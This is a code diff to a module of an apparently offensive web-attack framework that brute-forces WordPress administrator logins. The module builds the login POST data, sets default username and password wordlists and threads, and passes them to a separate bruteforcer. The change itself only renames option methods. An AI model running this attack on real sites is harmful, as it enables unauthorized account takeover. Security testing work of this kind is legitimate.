@@ -2,7 +2,7 @@
 
 from w2a.core.templates import Templates
 from w2a.config import CONFIG
-from w2a.lib.net.http import HTTP
+# from w2a.lib.net.http import HTTP
 
 from urllib.parse import quote_plus
 class Module(Templates):
@@ -13,16 +13,16 @@ class Module(Templates):
 		self.description 	= 'Brute wordpress administrator account'
 		self.detailed_description	= 'This module retreives connect with dictionary username and password'
 		#########################################
-		self.options.addString('URL', 'Link login')
-		self.options.addString('USERNAME', 'Account login', False, default = 'admin')
-		self.options.addString('PASSWORD', 'Password login', False)
-		self.options.addInteger('THREADS', 'Thread of bruter', default = 5)
-		self.options.addBoolean('VERBOSE', 'Verbose', default = True)
-		self.options.addPath('USERLIST', 'File containing passwords to test', default = CONFIG.DATA_PATH + '/brute/username.lst')
-		self.options.addPath('PASSLIST', 'File containing usernames to test', default = CONFIG.DATA_PATH + '/brute/pass.vn')
+		self.options.add_string('URL', 'Link login')
+		self.options.add_string('USERNAME', 'Account login', False, default = 'admin')
+		self.options.add_string('PASSWORD', 'Password login', False)
+		self.options.add_integer('THREADS', 'Thread of bruter', default = 5)
+		self.options.add_boolean('VERBOSE', 'Verbose', default = True)
+		self.options.add_path('USERLIST', 'File containing passwords to test', default = CONFIG.DATA_PATH + '/brute/username.lst')
+		self.options.add_path('PASSLIST', 'File containing usernames to test', default = CONFIG.DATA_PATH + '/brute/pass.vn')
 		
-		self.advanced_options.addInteger('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
-		self.advanced_options.addInteger('DELAY', 'Delay time if thread = 1', default = 1)
+		self.advanced_options.add_integer('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
+		self.advanced_options.add_integer('DELAY', 'Delay time if thread = 1', default = 1)
 	def run(self, frmwk, args):
 		module_name		= 'attack/web_bruter'
 
@@ -35,19 +35,19 @@ class Module(Templates):
 		param		= 'log=__USER__&pwd=__PASS__&wp-submit=Log+In&redirect_to='+quote_plus(self.options['URL'])+'&testcookie=1'
 		frmwk.print_status('Start bruteforcer!')
 		bruter	= frmwk.modules[module_name]
-		bruter.options.addString('URL', 'Link login', default = self.options['URL'])
-		bruter.options.addString('USERNAME', 'Account login', default = self.options['USERNAME'])
-		bruter.options.addString('PASSWORD', 'Password login', default = self.options['PASSWORD'])
-		bruter.options.addString('DATA', 'Date with POST method', default = param)
-		bruter.options.addString('CHECKTYPE', 'Type of checker success login', default = checktype)
-		bruter.options.addString('TOKEN', 'Error string', default = tokenstr)
-		bruter.options.addInteger('THREADS', 'Date with POST method', default = self.options['THREADS'])
-		bruter.options.addPath('USERLIST', 'passwords to test', default = self.options['USERLIST'])
-		bruter.options.addPath('PASSLIST', 'usernames to test', default = self.options['PASSLIST'])
-		bruter.options.addBoolean('VERBOSE', 'Verbose', default = self.options['VERBOSE'])
-		bruter.advanced_options.addString('COOKIE', 'Cookie', default = victim.headers['Cookie'] if victim.headers['Cookie'] else None)
-		bruter.advanced_options.addInteger('DELAY', 'Delay time', default = self.advanced_options['DELAY'])
-		bruter.advanced_options.addInteger('TIMEOUT', 'Time out request', default = self.advanced_options['TIMEOUT'])
-		bruter.advanced_options.addBoolean('STOP', 'Stop scanning', default = True)
+		bruter.options.add_string('URL', 'Link login', default = self.options['URL'])
+		bruter.options.add_string('USERNAME', 'Account login', default = self.options['USERNAME'])
+		bruter.options.add_string('PASSWORD', 'Password login', default = self.options['PASSWORD'])
+		bruter.options.add_string('DATA', 'Date with POST method', default = param)
+		bruter.options.add_string('CHECKTYPE', 'Type of checker success login', default = checktype)
+		bruter.options.add_string('TOKEN', 'Error string', default = tokenstr)
+		bruter.options.add_integer('THREADS', 'Date with POST method', default = self.options['THREADS'])
+		bruter.options.add_path('USERLIST', 'passwords to test', default = self.options['USERLIST'])
+		bruter.options.add_path('PASSLIST', 'usernames to test', default = self.options['PASSLIST'])
+		bruter.options.add_boolean('VERBOSE', 'Verbose', default = self.options['VERBOSE'])
+		bruter.advanced_options.add_string('COOKIE', 'Cookie', default = victim.headers['Cookie'] if victim.headers['Cookie'] else None)
+		bruter.advanced_options.add_integer('DELAY', 'Delay time', default = self.advanced_options['DELAY'])
+		bruter.advanced_options.add_integer('TIMEOUT', 'Time out request', default = self.advanced_options['TIMEOUT'])
+		bruter.advanced_options.add_boolean('STOP', 'Stop scanning', default = True)
 		bruter.run(frmwk, None)
 		frmwk.reload_module(module_name)
